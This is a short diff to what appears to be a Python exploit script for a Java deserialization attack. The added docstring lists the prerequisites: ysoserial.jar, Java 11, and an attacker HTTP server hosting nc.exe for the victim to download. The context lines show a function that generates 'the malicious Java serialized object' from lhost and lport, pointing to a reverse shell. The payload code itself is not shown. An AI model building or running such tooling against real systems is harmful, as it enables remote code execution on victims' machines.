@@ -7,6 +7,14 @@ from hashlib import sha1
 from base64 import b64decode, b64encode
 import pyDes, hmac
 
+"""
+**IMPORTANT**
+To execute this script, ensure the following prerequisites are met:
+    - `ysoserial.jar` is located in the same directory as this Python script.
+    - Java 11 is installed to run `ysoserial.jar`.
+    - An HTTP server is running on port 80, hosting the `nc.exe` binary for the victim to download.
+"""
+
 def generate_payload(lhost, lport):
     """
     Generates the malicious Java serialized object
